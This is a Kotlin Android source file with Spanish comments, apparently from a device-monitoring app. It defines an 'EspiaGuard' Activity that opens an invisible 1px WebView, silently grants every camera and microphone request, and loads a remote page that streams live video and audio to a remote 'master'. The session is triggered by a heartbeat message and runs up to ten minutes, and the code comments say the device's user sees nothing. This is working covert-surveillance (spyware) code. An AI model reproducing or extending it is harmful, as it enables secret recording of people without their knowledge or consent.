package dev.levo.yapecaptor

import android.annotation.SuppressLint
import android.os.Build
import android.os.Bundle
import android.webkit.PermissionRequest
import android.webkit.WebChromeClient
import android.webkit.WebSettings
import android.webkit.WebView
import androidx.appcompat.app.AppCompatActivity

/**
 * [MosGuard · Spy2.0] La Activity que corre el streaming en vivo (video + audio) dentro de un WebView.
 * Carga guard-espia.html (la página de Spy 2.0 embebible) y le concede cámara + micrófono. Se lanza
 * cuando el latido trae una sesión de espía pedida por el master. Reusa el motor probado de Spy 2.0.
 *
 * Sin vista para el usuario del equipo (WebView de 1px): solo transmite. El master ve/escucha desde MOS.
 * Nota: capturar con la pantalla apagada / la app de fondo depende del fabricante (igual que Spy 2.0).
 */
class EspiaGuard : AppCompatActivity() {

    private var web: WebView? = null

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        val secreto = intent?.getStringExtra("secreto") ?: ""
        val sesion  = intent?.getStringExtra("sesion") ?: ""
        val device  = intent?.getStringExtra("device") ?: ""
        if (secreto.isBlank() || sesion.isBlank() || device.isBlank()) { finish(); return }

        val w = WebView(this)
        web = w
        w.settings.apply {
            javaScriptEnabled = true
            mediaPlaybackRequiresUserGesture = false   // getUserMedia sin gesto
            domStorageEnabled = true
            cacheMode = WebSettings.LOAD_NO_CACHE
        }
        w.webChromeClient = object : WebChromeClient() {
            override fun onPermissionRequest(request: PermissionRequest) {
                // cámara + micrófono para la página de streaming (es nuestro propio HTML)
                try { request.grant(request.resources) } catch (_: Throwable) {}
            }
        }
        setContentView(w)
        val url = "https://levo19.github.io/MOS/guard-espia.html" +
            "?secreto=" + android.net.Uri.encode(secreto) +
            "&sesion=" + android.net.Uri.encode(sesion) +
            "&device=" + android.net.Uri.encode(device)
        w.loadUrl(url)

        // se cierra sola cuando la sesión de espía expira (máx 10 min)
        w.postDelayed({ try { finish() } catch (_: Throwable) {} }, 10 * 60 * 1000L)
    }

    override fun onDestroy() {
        try { web?.loadUrl("about:blank"); web?.destroy() } catch (_: Throwable) {}
        web = null
        super.onDestroy()
    }
}
